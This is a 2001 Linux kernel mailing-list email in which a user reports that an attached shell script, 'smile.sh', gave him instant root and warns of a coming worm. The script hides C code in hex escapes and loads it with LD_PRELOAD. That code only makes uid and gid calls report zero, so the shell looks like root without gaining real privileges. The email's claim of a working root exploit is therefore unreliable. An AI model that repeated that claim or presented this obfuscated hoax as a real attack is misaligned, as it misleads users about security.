Return-Path: <linux-kernel-owner@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id <S264329AbRHMTHQ>; Mon, 13 Aug 2001 15:07:16 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org
	id <S266251AbRHMTG4>; Mon, 13 Aug 2001 15:06:56 -0400
Received: from NS.iNES.RO ([193.230.220.1]:49335 "EHLO smtp.ines.ro")
	by vger.kernel.org with ESMTP id <S264329AbRHMTGv>;
	Mon, 13 Aug 2001 15:06:51 -0400
Message-ID: <3B7822E5.9AE35D4A@interplus.ro>
Date: Mon, 13 Aug 2001 21:56:37 +0300
From: Mircea Ciocan <mirceac@interplus.ro>
Organization: Home Office
X-Mailer: Mozilla 4.78 [en] (X11; U; Linux 2.4.7-ac2 i686)
X-Accept-Language: en
MIME-Version: 1.0
To: Alan Cox <alan@lxorguk.ukuu.org.uk>
CC: Linux Kernel List <linux-kernel@vger.kernel.org>
Subject: Is there something that can be done against this ???
X-Priority: 1 (Highest)
In-Reply-To: <E15WK98-0007gd-00@the-village.bc.nu>
Content-Type: multipart/mixed;
 boundary="------------F2E7C16DFD3A4066C4362A4F"
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

This is a multi-part message in MIME format.
--------------F2E7C16DFD3A4066C4362A4F
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

	The attached piece of script kiddie shit is the first one that worked
flawlessly on my Mandrake box :((( ( kernel 2.4.7ac2, glibc-2.2.3 ),
instant root access !!!.
	I was stunned, and it seem that is the beginning of a Linux Code Red
lookalike worm :(((( using that exploit, probably this is not the most
apropriate place to send this, but I'm not subscribed to the glibc
mailing list and I just hope that some glibc hackers are on linux kernel
list also and they see that and do something before we join the ranks of
M$.

		Dead worried,

		Mircea C.

P.S. Please tell me that I'm just being parnoid and that crap didn't
work on your systems with a lookalike configuration.
--------------F2E7C16DFD3A4066C4362A4F
Content-Type: application/x-sh;
 name="smile.sh"
Content-Transfer-Encoding: quoted-printable
Content-Disposition: inline;
 filename="smile.sh"

#Simple local shell exploit for Linux/ix86
#This program demonstrates a security problem in ld (the GNU linker)
#Written by FAT-KID with "great respect" to all .ro SCRIPT KIDDIES
#Greetings: #denied (undernet) =

#Fix: No fuckin idea for a good fix... a little sense of humor maybe :)
#Eat a frog for more info.

#!/bin/bash
echo -ne "Creating malicious code... "
echo -e "\x23\x69\x6e\x63\x6c\x75\x64\x65\x20\x3c\x73\x74\x64\x69\x6f\x2e=
\x68\x3e\n\x23\x69\x6e\x63\x6c\x75\x64\x65\x20\x3c\x73\x74\x64\x6c\x69\x6=
2\x2e\x68\x3e\n\x69\x6e\x74\x20\x67\x65\x74\x75\x69\x64\x28\x29\x20\x7b\x=
20\x72\x65\x74\x75\x72\x6e\x28\x30\x29\x3b\x20\x7d\x20\x69\x6e\x74\x20\x6=
7\x65\x74\x65\x75\x69\x64\x28\x29\x20\x7b\x20\x72\x65\x74\x75\x72\x6e\x28=
\x30\x29\x3b\x20\x7d\x20\x69\x6e\x74\x20\x67\x65\x74\x67\x69\x64\x28\x29\=
x20\x7b\x20\x72\x65\x74\x75\x72\x6e\x28\x30\x29\x3b\x20\x7d\x20\x69\x6e\x=
74\x20\x67\x65\x74\x65\x67\x69\x64\x28\x29\x20\x7b\x20\x72\x65\x74\x75\x7=
2\x6e\x28\x30\x29\x3b\x20\x7d\x20\x69\x6e\x74\x20\x67\x65\x74\x67\x72\x6f=
\x75\x70\x73\x28\x69\x6e\x74\x20\x73\x69\x7a\x65\x2c\x20\x69\x6e\x74\x20\=
x6c\x69\x73\x74\x5b\x5d\x29\x20\x7b\x20\x6c\x69\x73\x74\x20\x3d\x20\x28\x=
69\x6e\x74\x20\x2a\x29\x6d\x61\x6c\x6c\x6f\x63\x28\x73\x69\x7a\x65\x6f\x6=
6\x28\x69\x6e\x74\x29\x29\x3b\x20\x72\x65\x74\x75\x72\x6e\x28\x31\x29\x3b=
\x20\x7d">/tmp/temp.c
sleep 1
echo -ne "done.\nCompiling exploit... "
gcc -shared -o /tmp/temp.so /tmp/temp.c
rm -rf /tmp/temp.c
sleep 1
echo -ne "done.\nExploiting ld...\n"
sleep 3
echo -ne "done.\nBug sucessfully exploited. \x62\x79\x20\x46\x41\x54\x2d\=
x4b\x49\x44\x20\x3c\x61\x74\x6d\x6f\x73\x40\x73\x70\x6f\x30\x66\x65\x64\x=
2e\x63\x6f\x6d\x3e"
echo -e "\n"
export LD_LIBRARY_PATH=3D/tmp
LD_PRELOAD=3D/tmp/temp.so bash
rm -rf /tmp/temp.so


--------------F2E7C16DFD3A4066C4362A4F--

